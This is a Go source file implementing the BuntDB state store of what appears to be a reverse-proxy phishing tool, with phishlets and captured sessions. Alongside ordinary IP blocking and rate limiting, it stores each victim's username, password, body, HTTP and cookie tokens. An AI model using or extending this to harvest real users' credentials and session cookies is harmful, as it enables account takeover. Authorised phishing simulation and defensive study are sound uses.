// Package database provides the proxy-owned BuntDB state store.
package database

import (
	"encoding/json"
	"errors"
	"fmt"
	"net"
	"sort"
	"sync"
	"time"

	"github.com/tidwall/buntdb"
)

const blockedIPPrefix = "ip:block:"
const rateLimitPrefix = "ip:rate:"

var ErrClosed = errors.New("proxy database is closed")

type persistenceOp func(*buntdb.Tx) error

// Database keeps request-path state in memory and serializes durable BuntDB
// writes on one background goroutine. BuntDB remains the only proxy database.
type Database struct {
	path string
	db   *buntdb.DB

	stateMu       sync.RWMutex
	sessionsByID  map[int]*Session
	sessionsBySID map[string]*Session
	nextSessionID int
	rateWindows   map[string]rateWindow

	queueMu    sync.Mutex
	queueReady *sync.Cond
	queue      []persistenceOp
	inFlight   bool
	closed     bool
	lastErr    error
	writerDone chan struct{}
	closeOnce  sync.Once
}

type rateWindow struct {
	Count   int   `json:"count"`
	ResetAt int64 `json:"reset_at"`
}

func NewDatabase(path string) (*Database, error) {
	db, err := buntdb.Open(path)
	if err != nil {
		return nil, err
	}
	if err := db.SetConfig(buntdb.Config{
		SyncPolicy:           buntdb.EverySecond,
		AutoShrinkPercentage: 100,
		AutoShrinkMinSize:    32 * 1024 * 1024,
	}); err != nil {
		db.Close()
		return nil, err
	}

	d := &Database{
		path:          path,
		db:            db,
		sessionsByID:  make(map[int]*Session),
		sessionsBySID: make(map[string]*Session),
		nextSessionID: 1,
		rateWindows:   make(map[string]rateWindow),
		writerDone:    make(chan struct{}),
	}
	d.queueReady = sync.NewCond(&d.queueMu)
	if err := d.sessionsInit(); err != nil {
		db.Close()
		return nil, err
	}
	if err := d.loadSessions(); err != nil {
		db.Close()
		return nil, err
	}
	if err := d.loadRateWindows(); err != nil {
		db.Close()
		return nil, err
	}
	go d.persistenceLoop()
	return d, nil
}

func (d *Database) Path() string { return d.path }

func (d *Database) enqueue(op persistenceOp) error {
	d.queueMu.Lock()
	defer d.queueMu.Unlock()
	if d.closed {
		return ErrClosed
	}
	d.queue = append(d.queue, op)
	d.queueReady.Signal()
	return nil
}

func (d *Database) persistenceLoop() {
	defer close(d.writerDone)
	for {
		d.queueMu.Lock()
		for len(d.queue) == 0 && !d.closed {
			d.queueReady.Wait()
		}
		if len(d.queue) == 0 && d.closed {
			d.queueMu.Unlock()
			return
		}
		op := d.queue[0]
		d.queue[0] = nil
		d.queue = d.queue[1:]
		d.inFlight = true
		d.queueMu.Unlock()

		err := d.db.Update(op)

		d.queueMu.Lock()
		if err != nil {
			d.lastErr = err
		}
		d.inFlight = false
		if len(d.queue) == 0 {
			d.queueReady.Broadcast()
		}
		d.queueMu.Unlock()
	}
}

// Flush waits for queued writes and compacts BuntDB. It is intended for CLI
// maintenance and shutdown, never for an HTTP request path.
func (d *Database) Flush() {
	d.queueMu.Lock()
	for len(d.queue) > 0 || d.inFlight {
		d.queueReady.Wait()
	}
	d.queueMu.Unlock()
	_ = d.db.Shrink()
}

func (d *Database) LastPersistenceError() error {
	d.queueMu.Lock()
	defer d.queueMu.Unlock()
	return d.lastErr
}

func (d *Database) Close() error {
	var closeErr error
	d.closeOnce.Do(func() {
		d.queueMu.Lock()
		d.closed = true
		d.queueReady.Broadcast()
		d.queueMu.Unlock()
		<-d.writerDone
		if err := d.LastPersistenceError(); err != nil {
			closeErr = err
		}
		if err := d.db.Close(); closeErr == nil {
			closeErr = err
		}
	})
	return closeErr
}

func (d *Database) CreateSession(sid, phishlet, landingURL, userAgent, remoteAddr string) error {
	return d.sessionsCreate(sid, phishlet, landingURL, userAgent, remoteAddr)
}

func (d *Database) ListSessions() ([]*Session, error) { return d.sessionsList() }

func (d *Database) SetSessionUsername(sid, username string) error {
	return d.sessionsUpdate(sid, func(s *Session) { s.Username = username })
}

func (d *Database) SetSessionPassword(sid, password string) error {
	return d.sessionsUpdate(sid, func(s *Session) { s.Password = password })
}

func (d *Database) SetSessionCustom(sid, name, value string) error {
	return d.sessionsUpdate(sid, func(s *Session) { s.Custom[name] = value })
}

func (d *Database) SetSessionBodyTokens(sid string, tokens map[string]string) error {
	copyTokens := cloneStringMap(tokens)
	return d.sessionsUpdate(sid, func(s *Session) { s.BodyTokens = copyTokens })
}

func (d *Database) SetSessionHttpTokens(sid string, tokens map[string]string) error {
	copyTokens := cloneStringMap(tokens)
	return d.sessionsUpdate(sid, func(s *Session) { s.HttpTokens = copyTokens })
}

func (d *Database) SetSessionCookieTokens(sid string, tokens map[string]map[string]*CookieToken) error {
	copyTokens := cloneCookieTokens(tokens)
	return d.sessionsUpdate(sid, func(s *Session) { s.CookieTokens = copyTokens })
}

func (d *Database) DeleteSession(sid string) error {
	d.stateMu.Lock()
	s, ok := d.sessionsBySID[sid]
	if !ok {
		d.stateMu.Unlock()
		return fmt.Errorf("session not found: %s", sid)
	}
	delete(d.sessionsBySID, sid)
	delete(d.sessionsByID, s.Id)
	key := sessionKey(s.Id)
	err := d.enqueue(func(tx *buntdb.Tx) error {
		_, err := tx.Delete(key)
		return err
	})
	d.stateMu.Unlock()
	return err
}

func (d *Database) DeleteSessionById(id int) error {
	d.stateMu.Lock()
	s, ok := d.sessionsByID[id]
	if !ok {
		d.stateMu.Unlock()
		return fmt.Errorf("session ID not found: %d", id)
	}
	delete(d.sessionsByID, id)
	delete(d.sessionsBySID, s.SessionId)
	key := sessionKey(id)
	err := d.enqueue(func(tx *buntdb.Tx) error {
		_, err := tx.Delete(key)
		return err
	})
	d.stateMu.Unlock()
	return err
}

// BlockIP persists dynamic IP control state in the proxy's BuntDB file.
func (d *Database) BlockIP(ip string) error {
	parsed := net.ParseIP(ip)
	if parsed == nil {
		return fmt.Errorf("invalid ip address: %s", ip)
	}
	key := blockedIPPrefix + parsed.String()
	return d.enqueue(func(tx *buntdb.Tx) error {
		_, _, err := tx.Set(key, "1", nil)
		return err
	})
}

func (d *Database) ListBlockedIPs() ([]string, error) {
	d.Flush()
	ips := make([]string, 0)
	err := d.db.View(func(tx *buntdb.Tx) error {
		return tx.AscendKeys(blockedIPPrefix+"*", func(key, _ string) bool {
			ips = append(ips, key[len(blockedIPPrefix):])
			return true
		})
	})
	sort.Strings(ips)
	return ips, err
}

// AllowRequest applies an in-memory fixed-window throttle and queues its
// expiring snapshot for BuntDB persistence. A non-positive limit disables it.
func (d *Database) AllowRequest(ip string, limit int, window time.Duration) (bool, error) {
	if limit <= 0 {
		return true, nil
	}
	parsed := net.ParseIP(ip)
	if parsed == nil {
		return false, fmt.Errorf("invalid ip address: %s", ip)
	}
	if window <= 0 {
		window = time.Minute
	}
	now := time.Now()
	keyIP := parsed.String()
	d.stateMu.Lock()
	record := d.rateWindows[keyIP]
	if record.ResetAt <= now.UnixNano() {
		record = rateWindow{ResetAt: now.Add(window).UnixNano()}
	}
	record.Count++
	d.rateWindows[keyIP] = record

	value, err := json.Marshal(record)
	if err != nil {
		d.stateMu.Unlock()
		return false, err
	}
	ttl := time.Until(time.Unix(0, record.ResetAt))
	if ttl <= 0 {
		ttl = window
	}
	key := rateLimitPrefix + keyIP
	err = d.enqueue(func(tx *buntdb.Tx) error {
		_, _, err := tx.Set(key, string(value), &buntdb.SetOptions{Expires: true, TTL: ttl})
		return err
	})
	d.stateMu.Unlock()
	return record.Count <= limit, err
}

func (d *Database) loadRateWindows() error {
	now := time.Now().UnixNano()
	return d.db.View(func(tx *buntdb.Tx) error {
		return tx.AscendKeys(rateLimitPrefix+"*", func(key, value string) bool {
			var record rateWindow
			if json.Unmarshal([]byte(value), &record) == nil && record.ResetAt > now {
				d.rateWindows[key[len(rateLimitPrefix):]] = record
			}
			return true
		})
	})
}

func sessionKey(id int) string { return fmt.Sprintf("%s:%d", SessionTable, id) }

func marshalSession(s *Session) (string, error) {
	data, err := json.Marshal(s)
	return string(data), err
}
